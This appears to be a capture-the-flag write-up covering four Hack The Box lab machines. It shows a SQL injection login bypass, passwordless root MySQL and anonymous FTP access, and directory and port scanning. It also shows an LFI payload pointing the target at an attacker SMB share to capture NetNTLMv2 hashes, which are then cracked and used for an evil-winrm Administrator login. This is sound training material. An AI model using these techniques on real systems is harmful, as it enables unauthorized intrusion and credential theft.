# Appointment
## Connection
We can search the IP in the navbar to get a website.
<img src="https://raw.githubusercontent.com/zeropio/zeropio.github.io/main/_posts/ctf/htb/starting-point/img/Screenshot_1.jpg" weight="100%" />

We will try a basic sql-injection, login with the user:
```console
' or '1'='1' #
```
For the password we just need to write a letter.

## Flag
The flag will be in front of us.

---

# Sequel
## Connection
We will use mysql to connect, with the **root** user.
```console
> mysql -u root -h 10.129.220.35
```

## Flag
Now we are in, we just need to list all the databases and search for the flag.
```sql
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
MariaDB [(none)]> use htb;

MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+

MariaDB [htb]> select * from config;
```

# Crocodile
## Connection
We will connect with ftp and the user **anonymous**. There we can download two files, with users and passwords.
```console
> ftp 10.129.122.93
```
With **gobuster** we can check for others files in the webpage, and we can see a **login.php**:
```console
>  gobuster dir -u http://10.129.122.93/ -w /usr/share/wordlists/directory-list-2.3-small.txt -x php
```

## Flag
We will have now this page:
<img src="https://raw.githubusercontent.com/zeropio/zeropio.github.io/main/_posts/ctf/htb/starting-point/img/Screenshot_2.jpg" weight="100%" />
With the **admin** login we can enter and get our flag.

# Responder
### Enumeration
Nmap:
```
#Nmap 7.92 scan initiated Sat Apr 30 10:43:29 2022 as: nmap -p- -T5 -oN nmap2 10.129.212.41
Nmap scan report for 10.129.212.41
Host is up (0.054s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
5985/tcp open  wsman
7680/tcp open  pando-pub

#Nmap done at Sat Apr 30 10:45:10 2022 -- 1 IP address (1 host up) scanned in 101.42 seconds
```

##### We need to add the IP with the domain to access the webpage.

### Explotation
We found a <a href="{{ "/notes/web/lfi-rfi/" | prepend: site.baseurl }}">LFI</a> in the page.
Then we can start a **Samba** server and forces the page to load it:
```console
> sudo responder -I tun0 -A
```
And then:
```
http://unika.htb/index.php?page=//10.10.15.167/kali
```

This will give us the password encrypted. With **john** we can decode it:
```console
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
```
##### We can found all the previosly hashes in **/usr/share/responder/logs/Responder-Session.log**.

Finally we can exploit **winrm** and get the flag:
```console
> evil-winrm -i 10.129.212.41 -u Administrator -p badminton
```

### Flag
Finally we can get the flag in the **Desktop**.
